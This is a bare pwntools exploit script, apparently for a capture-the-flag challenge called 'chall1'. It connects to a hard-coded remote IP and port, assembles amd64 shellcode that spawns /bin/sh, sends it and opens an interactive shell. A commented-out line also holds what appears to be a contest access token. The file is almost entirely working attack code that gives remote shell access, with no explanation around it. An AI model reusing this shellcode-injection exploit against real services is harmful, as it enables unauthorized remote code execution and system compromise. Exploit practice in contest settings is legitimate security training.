from pwn import *
import binascii
import subprocess

file_crack = './chall1'
glibc = '/lib/x86_64-linux-gnu/libc.so.6'
domain_name = '202.38.93.241'
port = 10000
remo = 1
archive = 'amd64'

context(os='linux', arch=archive, log_level='debug')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

def one_gadget(filename):
  return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))

def complement_code_32(num):
    return num & 0xffffffff
def complement_code_64(num):
    return num & 0xffffffffffffffff

elf = ELF(file_crack)
if remo:
    n = remote(domain_name, port)
else:
    n = elf.process(env={'LD_PRELOAD':glibc})

one_gadget_ = one_gadget(glibc)
log.info(map(lambda x: hex(x), one_gadget_))

pay = shellcraft.amd64.linux.sh()
pay = asm(pay)
# n.sendlineafter("token:","14:MEUCIHAqiC3NiI58R/mqK/U3AGxugtXEk3UgkjvGRXhe3n8GAiEA69sxo12BVYBToXMFc/r9gU7T6hNgewqerk5B/t2VC8o=")
n.send(pay)
n.interactive()

